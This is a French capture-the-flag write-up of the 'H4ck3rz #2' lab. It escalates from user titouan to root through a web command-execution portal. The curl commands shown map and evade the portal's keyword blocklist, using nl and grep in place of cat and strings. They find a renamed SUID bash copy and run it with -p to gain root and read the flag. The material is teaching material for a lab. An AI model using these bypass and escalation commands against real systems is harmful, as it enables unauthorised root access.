H4ck3rz #2
> **Catégorie :** Privilege Escalation (SUID bash) / Contournement de filtre
> **Cible :** `10.10.0.2` (suite de H4ck3rz — passage `titouan` → `root`)
> **Flag :** `EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}`
---
Objectif
Suite directe de H4ck3rz. On a déjà l'exécution de commandes en tant que
`titouan` (via `sudo NOPASSWD` depuis `www-data`). Le but ici est de passer de
`titouan` à root et de lire `/root/root.txt`.
Le fil rouge : contourner méthodiquement le filtre de mots-clés du portail RCE
et exploiter une faille SUID classique sur une copie de bash.
---
Contexte de départ
Accès à un portail web `portal.php` qui exécute des commandes (RCE) en tant que
`www-data`.
`www-data` peut exécuter n'importe quelle commande en tant que `titouan` sans
mot de passe : `sudo -u titouan ...`.
Un filtre bloque certains mots-clés avec le message
« Command contain some forbidden keywords ».
---
Étape 1 — Énumération : permissions sudo et fichiers SUID
Une fois confirmé qu'on peut exécuter des commandes en tant que `titouan`, on
cherche les vecteurs d'escalade classiques vers root. Le plus courant : les
binaires SUID.
```bash
curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
  --data-urlencode "command=sudo -u titouan find / -perm -4000 -type f 2>/dev/null" \
  --data-urlencode "sub=Execute"
```
`find / -perm -4000` → cherche tous les fichiers avec le bit SUID activé.
`-type f` → uniquement les fichiers.
`2>/dev/null` → jette les erreurs de permission.
> **Rappel SUID :** un fichier SUID s'exécute avec les droits de son
> **propriétaire**, pas de celui qui le lance. Un binaire SUID appartenant à root
> peut donc donner un accès root s'il est détournable.
Résultat clé : parmi les binaires SUID standards, un fichier suspect apparaît :
```
/home/titouan/42sh
```
Ce n'est pas un binaire système classique — un SUID dans un home personnel
est un vecteur d'escalade évident. Le nom (`42sh`) fait clin d'œil au portail et
à l'utilisateur `d4rk_T1t0u4N`.
---
Étape 2 — Identification du binaire
```bash
curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
  --data-urlencode "command=sudo -u titouan readlink -f /home/titouan/42sh" \
  --data-urlencode "sub=Execute"
```
`readlink -f` → résout les liens symboliques et donne le chemin réel.
Le fichier n'était pas un simple lien symbolique résolu ailleurs → il faut
analyser son contenu pour comprendre sa vraie nature.
---
Étape 3 — Contournement du filtre de mots-clés
Le portail bloque certaines commandes de lecture (`cat`, `head`, `tail`,
`less`, `more`, `strings`...). Plutôt que de deviner ce qui passe, on teste
systématiquement une liste de commandes candidates :
```bash
for kw in cat head strings tail less more sudo nl grep od xxd file; do
  echo "=== $kw ==="
  curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
    --data-urlencode "command=$kw /etc/hostname" \
    --data-urlencode "sub=Execute" | grep -o "forbidden keywords"
done
```
> **La logique :** si la réponse contient « forbidden keywords », la commande est
> bloquée ; sinon elle passe. En bouclant, on cartographie le filtre au lieu de
> tâtonner.
Résultat :
Commande	Filtrée ?
`cat`, `head`, `tail`, `less`, `more`	❌ bloquées
`sudo`, `nl`, `grep`, `od`, `xxd`, `file`	✅ autorisées
On utilise `grep` comme substitut à `strings` pour extraire les chaînes lisibles
d'un binaire :
```bash
curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
  --data-urlencode "command=sudo -u titouan grep -a -o '[[:print:]]\{4,\}' /home/titouan/42sh" \
  --data-urlencode "sub=Execute"
```
`grep -a` → traite un fichier binaire comme du texte.
`-o '[[:print:]]\{4,\}'` → extrait les séquences d'au moins 4 caractères
imprimables (exactement ce que fait `strings`).
---
Étape 4 — Analyse du contenu du binaire
La sortie révèle un contenu typique de binaire bash :
messages d'aide des builtins (`for`, `while`, `read`, `declare`, `getopts`,
`history`...) ;
sections ELF classiques (`.dynsym`, `.rodata`, `.bss`, `.gnu_debuglink`...).
Conclusion : `/home/titouan/42sh` n'est pas un shell custom — c'est une
copie de `/bin/bash` renommée, avec le bit SUID actif et le SUID root
positionné.
---
Étape 5 — Exploitation de la faille SUID bash
C'est une faille de configuration très connue en pentest :
> Depuis **Bash 4.4+**, le shell **abandonne automatiquement ses privilèges
> effectifs** (drop du `euid`/`egid`) au démarrage si `euid != ruid`, **sauf**
> si on le lance explicitement en **mode privilégié** avec l'option **`-p`**.
Autrement dit : un bash SUID root ne donne pas un shell root si on le lance
normalement — c'est une protection intégrée. Il faut forcer le mode
privilégié avec `-p` pour conserver les droits SUID.
Test de vérification :
```bash
curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
  --data-urlencode "command=sudo -u titouan /home/titouan/42sh -p -c 'id'" \
  --data-urlencode "sub=Execute"
```
`-p` → privileged mode : ne drop pas les privilèges effectifs.
`-c 'id'` → exécute la commande `id` dans ce shell.
Résultat :
```
uid=1000(titouan) gid=1000(titouan) euid=0(root) egid=0(root) groups=0(root),1000(titouan)
```
Le `euid=0(root)` confirme que le mode privilégié a conservé les droits SUID :
on a un contexte d'exécution root via ce binaire.
---
Étape 6 — Lecture du flag root
Première tentative avec `cat`, bloquée par le filtre :
```bash
sudo -u titouan /home/titouan/42sh -p -c 'cat /root/root.txt'
# → "Command contain some forbidden keywords"
```
On contourne avec `nl` (identifié comme autorisé à l'étape 3) :
```bash
curl -s -b cookies.txt -X POST http://10.10.0.2/portal.php \
  --data-urlencode "command=sudo -u titouan /home/titouan/42sh -p -c 'nl /root/root.txt'" \
  --data-urlencode "sub=Execute"
```
→ Flag obtenu :
```
EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}
```
---
Concepts clés à retenir
Concept	Explication
Bit SUID	Un fichier SUID s'exécute avec les droits de son propriétaire → vecteur d'escalade si mal placé.
`find / -perm -4000`	Commande de référence pour lister les binaires SUID d'un système.
`strings` maison	`grep -a -o '[[:print:]]\{4,\}'` extrait les chaînes d'un binaire quand `strings` est filtré.
Bash privileged mode (`-p`)	Bash 4.4+ drop les privilèges SUID par défaut ; `-p` les conserve → c'est la clé de l'exploit.
Cartographie de filtre	Tester méthodiquement chaque mot-clé (boucle `for`) plutôt que deviner ce qui passe.
Substitution de commande	`nl`/`od`/`xxd` remplacent `cat` quand ce dernier est en blacklist.
---
Résumé de la chaîne d'attaque complète
Étape	Technique
1. Accès initial	username en commentaire HTML + password via page cachée du robots.txt
2. RCE	formulaire shell exécutant en `www-data`
3. Pivot user	`sudo -l` → `NOPASSWD: ALL` vers `titouan`
4. Découverte SUID	`find / -perm -4000` → bash renommé SUID dans `/home/titouan`
5. Contournement filtre	énumération systématique des mots-clés bloqués/autorisés
6. Privesc root	faille SUID bash sans drop de privilèges via `-p`
7. Flag	lecture de `/root/root.txt` avec `nl` (substitut à `cat`)
```
titouan (sudo NOPASSWD)
   → find -perm -4000 → /home/titouan/42sh (bash SUID root)
   → grep strings → confirmation "c'est bash"
   → 42sh -p -c 'id' → euid=0(root)
   → 42sh -p -c 'nl /root/root.txt' → FLAG
```